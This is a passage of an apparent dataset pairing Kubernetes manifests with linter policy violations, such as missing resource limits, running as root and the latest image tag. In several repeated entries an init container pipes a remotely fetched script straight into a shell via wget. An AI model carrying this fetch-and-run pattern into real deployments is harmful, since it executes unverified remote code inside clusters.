    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cifar10-single-job-1\nspec:\n  template:\n    metadata:\n      name: cifar10-single-job\n      labels:\n        app: cifar10-single-job\n    spec:\n      containers:\n      - name: pytorch\n        image: nvcr.io/nvidia/pytorch:18.11-py3\n        workingDir: /cifar10-training\n        env:\n        - name: JOB_ID\n          value: '1'\n        command:\n        - bash\n        args:\n        - -c\n        - python cifar10_train.py\n        volumeMounts:\n        - name: cifar10-training\n          mountPath: /cifar10-training\n        - name: cifar10-dataset\n          mountPath: /datasets\n      volumes:\n      - name: cifar10-training\n        gitRepo:\n          repository: https://github.com/elchan/kubernetes-hyperparam-exp.git\n          revision: master\n          directory: .\n      - name: cifar10-dataset\n        nfs:\n          server: 10.33.15.158\n          path: /products/nfsroot/cifardata\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pytorch\" has memory limit 0"
  },
  {
    "id": "8079",
    "manifest_path": "data/manifests/the_stack_sample/sample_2992.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:10.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 5432\n        envFrom:\n        - configMapRef:\n            name: postgres-config\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: postgredb\n      volumes:\n      - name: postgredb\n        persistentVolumeClaim:\n          claimName: postgres-pv-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgres\" does not have a read-only root file system"
  },
  {
    "id": "8080",
    "manifest_path": "data/manifests/the_stack_sample/sample_2992.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:10.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 5432\n        envFrom:\n        - configMapRef:\n            name: postgres-config\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: postgredb\n      volumes:\n      - name: postgredb\n        persistentVolumeClaim:\n          claimName: postgres-pv-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgres\" is not set to runAsNonRoot"
  },
  {
    "id": "8081",
    "manifest_path": "data/manifests/the_stack_sample/sample_2992.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:10.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 5432\n        envFrom:\n        - configMapRef:\n            name: postgres-config\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: postgredb\n      volumes:\n      - name: postgredb\n        persistentVolumeClaim:\n          claimName: postgres-pv-claim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgres\" has cpu request 0"
  },
  {
    "id": "8082",
    "manifest_path": "data/manifests/the_stack_sample/sample_2992.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: postgres\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:10.1\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 5432\n        envFrom:\n        - configMapRef:\n            name: postgres-config\n        volumeMounts:\n        - mountPath: /var/lib/postgresql/data\n          name: postgredb\n      volumes:\n      - name: postgredb\n        persistentVolumeClaim:\n          claimName: postgres-pv-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"postgres\" has memory limit 0"
  },
  {
    "id": "8083",
    "manifest_path": "data/manifests/the_stack_sample/sample_2996.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: janusgraph\n  labels:\n    app: janusgraph\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: janusgraph\n  template:\n    metadata:\n      labels:\n        app: janusgraph\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - janusgraph\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: janusgraph\n        env:\n        - name: JANUS_PROPS_TEMPLATE\n          value: cql-es\n        - name: gremlinserver.channelizer\n          value: org.apache.tinkerpop.gremlin.server.channel.WsAndHttpChannelizer\n        - name: gremlinserver.gremlinPool\n          value: '16'\n        - name: janusgraph.index.search.hostname\n          value: elasticsearch\n        - name: janusgraph.query.force-index\n          value: 'true'\n        - name: janusgraph.schema.default\n          value: none\n        - name: janusgraph.storage.hostname\n          value: scylla\n        image: janusgraph/janusgraph:0.5.2\n        livenessProbe:\n          httpGet:\n            path: /?gremlin=100-1\n            port: 8182\n          initialDelaySeconds: 5\n          periodSeconds: 30\n        ports:\n        - containerPort: 8182\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"janusgraph\" does not have a read-only root file system"
  },
  {
    "id": "8084",
    "manifest_path": "data/manifests/the_stack_sample/sample_2996.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: janusgraph\n  labels:\n    app: janusgraph\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: janusgraph\n  template:\n    metadata:\n      labels:\n        app: janusgraph\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - janusgraph\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: janusgraph\n        env:\n        - name: JANUS_PROPS_TEMPLATE\n          value: cql-es\n        - name: gremlinserver.channelizer\n          value: org.apache.tinkerpop.gremlin.server.channel.WsAndHttpChannelizer\n        - name: gremlinserver.gremlinPool\n          value: '16'\n        - name: janusgraph.index.search.hostname\n          value: elasticsearch\n        - name: janusgraph.query.force-index\n          value: 'true'\n        - name: janusgraph.schema.default\n          value: none\n        - name: janusgraph.storage.hostname\n          value: scylla\n        image: janusgraph/janusgraph:0.5.2\n        livenessProbe:\n          httpGet:\n            path: /?gremlin=100-1\n            port: 8182\n          initialDelaySeconds: 5\n          periodSeconds: 30\n        ports:\n        - containerPort: 8182\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"janusgraph\" is not set to runAsNonRoot"
  },
  {
    "id": "8085",
    "manifest_path": "data/manifests/the_stack_sample/sample_2996.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: janusgraph\n  labels:\n    app: janusgraph\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: janusgraph\n  template:\n    metadata:\n      labels:\n        app: janusgraph\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - janusgraph\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: janusgraph\n        env:\n        - name: JANUS_PROPS_TEMPLATE\n          value: cql-es\n        - name: gremlinserver.channelizer\n          value: org.apache.tinkerpop.gremlin.server.channel.WsAndHttpChannelizer\n        - name: gremlinserver.gremlinPool\n          value: '16'\n        - name: janusgraph.index.search.hostname\n          value: elasticsearch\n        - name: janusgraph.query.force-index\n          value: 'true'\n        - name: janusgraph.schema.default\n          value: none\n        - name: janusgraph.storage.hostname\n          value: scylla\n        image: janusgraph/janusgraph:0.5.2\n        livenessProbe:\n          httpGet:\n            path: /?gremlin=100-1\n            port: 8182\n          initialDelaySeconds: 5\n          periodSeconds: 30\n        ports:\n        - containerPort: 8182\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"janusgraph\" has cpu request 0"
  },
  {
    "id": "8086",
    "manifest_path": "data/manifests/the_stack_sample/sample_2996.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: janusgraph\n  labels:\n    app: janusgraph\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: janusgraph\n  template:\n    metadata:\n      labels:\n        app: janusgraph\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - janusgraph\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: janusgraph\n        env:\n        - name: JANUS_PROPS_TEMPLATE\n          value: cql-es\n        - name: gremlinserver.channelizer\n          value: org.apache.tinkerpop.gremlin.server.channel.WsAndHttpChannelizer\n        - name: gremlinserver.gremlinPool\n          value: '16'\n        - name: janusgraph.index.search.hostname\n          value: elasticsearch\n        - name: janusgraph.query.force-index\n          value: 'true'\n        - name: janusgraph.schema.default\n          value: none\n        - name: janusgraph.storage.hostname\n          value: scylla\n        image: janusgraph/janusgraph:0.5.2\n        livenessProbe:\n          httpGet:\n            path: /?gremlin=100-1\n            port: 8182\n          initialDelaySeconds: 5\n          periodSeconds: 30\n        ports:\n        - containerPort: 8182\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"janusgraph\" has memory limit 0"
  },
  {
    "id": "8087",
    "manifest_path": "data/manifests/the_stack_sample/sample_2997.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: registry.gitlab.com/a.evseev/tmp/nginx-page:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"init\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8088",
    "manifest_path": "data/manifests/the_stack_sample/sample_2997.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: registry.gitlab.com/a.evseev/tmp/nginx-page:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"web\" is using an invalid container image, \"registry.gitlab.com/a.evseev/tmp/nginx-page:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8089",
    "manifest_path": "data/manifests/the_stack_sample/sample_2997.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: registry.gitlab.com/a.evseev/tmp/nginx-page:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "8090",
    "manifest_path": "data/manifests/the_stack_sample/sample_2997.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: registry.gitlab.com/a.evseev/tmp/nginx-page:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "8091",
    "manifest_path": "data/manifests/the_stack_sample/sample_2997.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: registry.gitlab.com/a.evseev/tmp/nginx-page:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "8092",
    "manifest_path": "data/manifests/the_stack_sample/sample_2997.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: registry.gitlab.com/a.evseev/tmp/nginx-page:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "8093",
    "manifest_path": "data/manifests/the_stack_sample/sample_2997.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: registry.gitlab.com/a.evseev/tmp/nginx-page:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "8094",
    "manifest_path": "data/manifests/the_stack_sample/sample_2997.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: registry.gitlab.com/a.evseev/tmp/nginx-page:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "8095",
    "manifest_path": "data/manifests/the_stack_sample/sample_2997.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: registry.gitlab.com/a.evseev/tmp/nginx-page:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "8096",
    "manifest_path": "data/manifests/the_stack_sample/sample_2997.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: registry.gitlab.com/a.evseev/tmp/nginx-page:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init\n    image: busybox:latest\n    command:\n    - sh\n    - -c\n    - wget -O- https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "8097",
    "manifest_path": "data/manifests/the_stack_sample/sample_2999.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n  - name: numalign\n    image: quay.io/fromani/numalign\n    imagePullPolicy: IfNotPresent\n    command:\n    - /usr/local/bin/numalign\n    env:\n    - name: NUMALIGN_SLEEP_HOURS\n      value: '127'\n    resources:\n      limits:\n        cpu: 1\n        memory: 256Mi\n      requests:\n        cpu: 1\n        memory: 256Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"numalign\" is using an invalid container image, \"quay.io/fromani/numalign\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8098",
    "manifest_path": "data/manifests/the_stack_sample/sample_2999.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n  - name: numalign\n    image: quay.io/fromani/numalign\n    imagePullPolicy: IfNotPresent\n    command:\n    - /usr/local/bin/numalign\n    env:\n    - name: NUMALIGN_SLEEP_HOURS\n      value: '127'\n    resources:\n      limits:\n        cpu: 1\n        memory: 256Mi\n      requests:\n        cpu: 1\n        memory: 256Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"numalign\" does not have a read-only root file system"
  },
  {
    "id": "8099",
    "manifest_path": "data/manifests/the_stack_sample/sample_2999.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nspec:\n  containers:\n  - name: numalign\n    image: quay.io/fromani/numalign\n    imagePullPolicy: IfNotPresent\n    command:\n    - /usr/local/bin/numalign\n    env:\n    - name: NUMALIGN_SLEEP_HOURS\n      value: '127'\n    resources:\n      limits:\n        cpu: 1\n        memory: 256Mi\n      requests:\n        cpu: 1\n        memory: 256Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"numalign\" is not set to runAsNonRoot"
  },
  {
    "id": "8100",
    "manifest_path": "data/manifests/the_stack_sample/sample_3000.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: postgresql2\nspec:\n  ports:\n  - name: db\n    port: 5432\n    nodePort: 31000\n  selector:\n    release_group: postgresql2\n    application: postgresql\n    component: server\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[application:postgresql component:server release_group:postgresql2])"
  },
  {
    "id": "8101",
    "manifest_path": "data/manifests/the_stack_sample/sample_3001.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4567\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8102",
    "manifest_path": "data/manifests/the_stack_sample/sample_3001.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4567\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8103",
    "manifest_path": "data/manifests/the_stack_sample/sample_3001.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4567\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8104",
    "manifest_path": "data/manifests/the_stack_sample/sample_3001.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4567\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8105",
    "manifest_path": "data/manifests/the_stack_sample/sample_3001.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4567\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8106",
    "manifest_path": "data/manifests/the_stack_sample/sample_3002.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: demo-client-xds\n  name: demo-client-xds\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: demo-client-xds\n  template:\n    metadata:\n      labels:\n        app: demo-client-xds\n    spec:\n      containers:\n      - image: demo-client\n        name: demo-client-xds\n        envFrom:\n        - configMapRef:\n            name: jaeger\n        env:\n        - name: UPSTREAM_HOST\n          value: xds:///demo-server-headless\n        - name: DURATION\n          value: 500ms\n        - name: GRPC_XDS_BOOTSTRAP\n          value: /etc/config/bootstrap.json\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 1\n          periodSeconds: 1\n          failureThreshold: 1\n        volumeMounts:\n        - name: bootstrap\n          mountPath: /etc/config\n      volumes:\n      - name: bootstrap\n        configMap:\n          name: demo-client-xds\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"demo-client-xds\" is using an invalid container image, \"demo-client\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8107",
    "manifest_path": "data/manifests/the_stack_sample/sample_3002.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: demo-client-xds\n  name: demo-client-xds\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: demo-client-xds\n  template:\n    metadata:\n      labels:\n        app: demo-client-xds\n    spec:\n      containers:\n      - image: demo-client\n        name: demo-client-xds\n        envFrom:\n        - configMapRef:\n            name: jaeger\n        env:\n        - name: UPSTREAM_HOST\n          value: xds:///demo-server-headless\n        - name: DURATION\n          value: 500ms\n        - name: GRPC_XDS_BOOTSTRAP\n          value: /etc/config/bootstrap.json\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 1\n          periodSeconds: 1\n          failureThreshold: 1\n        volumeMounts:\n        - name: bootstrap\n          mountPath: /etc/config\n      volumes:\n      - name: bootstrap\n        configMap:\n          name: demo-client-xds\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8108",
    "manifest_path": "data/manifests/the_stack_sample/sample_3002.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: demo-client-xds\n  name: demo-client-xds\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: demo-client-xds\n  template:\n    metadata:\n      labels:\n        app: demo-client-xds\n    spec:\n      containers:\n      - image: demo-client\n        name: demo-client-xds\n        envFrom:\n        - configMapRef:\n            name: jaeger\n        env:\n        - name: UPSTREAM_HOST\n          value: xds:///demo-server-headless\n        - name: DURATION\n          value: 500ms\n        - name: GRPC_XDS_BOOTSTRAP\n          value: /etc/config/bootstrap.json\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 1\n          periodSeconds: 1\n          failureThreshold: 1\n        volumeMounts:\n        - name: bootstrap\n          mountPath: /etc/config\n      volumes:\n      - name: bootstrap\n        configMap:\n          name: demo-client-xds\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"demo-client-xds\" does not have a read-only root file system"
  },
  {
    "id": "8109",
    "manifest_path": "data/manifests/the_stack_sample/sample_3002.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: demo-client-xds\n  name: demo-client-xds\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: demo-client-xds\n  template:\n    metadata:\n      labels:\n        app: demo-client-xds\n    spec:\n      containers:\n      - image: demo-client\n        name: demo-client-xds\n        envFrom:\n        - configMapRef:\n            name: jaeger\n        env:\n        - name: UPSTREAM_HOST\n          value: xds:///demo-server-headless\n        - name: DURATION\n          value: 500ms\n        - name: GRPC_XDS_BOOTSTRAP\n          value: /etc/config/bootstrap.json\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 1\n          periodSeconds: 1\n          failureThreshold: 1\n        volumeMounts:\n        - name: bootstrap\n          mountPath: /etc/config\n      volumes:\n      - name: bootstrap\n        configMap:\n          name: demo-client-xds\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"demo-client-xds\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "8110",
    "manifest_path": "data/manifests/the_stack_sample/sample_3002.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: demo-client-xds\n  name: demo-client-xds\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: demo-client-xds\n  template:\n    metadata:\n      labels:\n        app: demo-client-xds\n    spec:\n      containers:\n      - image: demo-client\n        name: demo-client-xds\n        envFrom:\n        - configMapRef:\n            name: jaeger\n        env:\n        - name: UPSTREAM_HOST\n          value: xds:///demo-server-headless\n        - name: DURATION\n          value: 500ms\n        - name: GRPC_XDS_BOOTSTRAP\n          value: /etc/config/bootstrap.json\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 1\n          periodSeconds: 1\n          failureThreshold: 1\n        volumeMounts:\n        - name: bootstrap\n          mountPath: /etc/config\n      volumes:\n      - name: bootstrap\n        configMap:\n          name: demo-client-xds\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"demo-client-xds\" is not set to runAsNonRoot"
  },
  {
    "id": "8111",
    "manifest_path": "data/manifests/the_stack_sample/sample_3002.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: demo-client-xds\n  name: demo-client-xds\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: demo-client-xds\n  template:\n    metadata:\n      labels:\n        app: demo-client-xds\n    spec:\n      containers:\n      - image: demo-client\n        name: demo-client-xds\n        envFrom:\n        - configMapRef:\n            name: jaeger\n        env:\n        - name: UPSTREAM_HOST\n          value: xds:///demo-server-headless\n        - name: DURATION\n          value: 500ms\n        - name: GRPC_XDS_BOOTSTRAP\n          value: /etc/config/bootstrap.json\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 1\n          periodSeconds: 1\n          failureThreshold: 1\n        volumeMounts:\n        - name: bootstrap\n          mountPath: /etc/config\n      volumes:\n      - name: bootstrap\n        configMap:\n          name: demo-client-xds\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"demo-client-xds\" has cpu request 0"
  },
  {
    "id": "8112",
    "manifest_path": "data/manifests/the_stack_sample/sample_3002.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: demo-client-xds\n  name: demo-client-xds\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: demo-client-xds\n  template:\n    metadata:\n      labels:\n        app: demo-client-xds\n    spec:\n      containers:\n      - image: demo-client\n        name: demo-client-xds\n        envFrom:\n        - configMapRef:\n            name: jaeger\n        env:\n        - name: UPSTREAM_HOST\n          value: xds:///demo-server-headless\n        - name: DURATION\n          value: 500ms\n        - name: GRPC_XDS_BOOTSTRAP\n          value: /etc/config/bootstrap.json\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 1\n          periodSeconds: 1\n          failureThreshold: 1\n        volumeMounts:\n        - name: bootstrap\n          mountPath: /etc/config\n      volumes:\n      - name: bootstrap\n        configMap:\n          name: demo-client-xds\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"demo-client-xds\" has memory limit 0"
  },
  {
    "id": "8113",
    "manifest_path": "data/manifests/the_stack_sample/sample_3009.yaml",
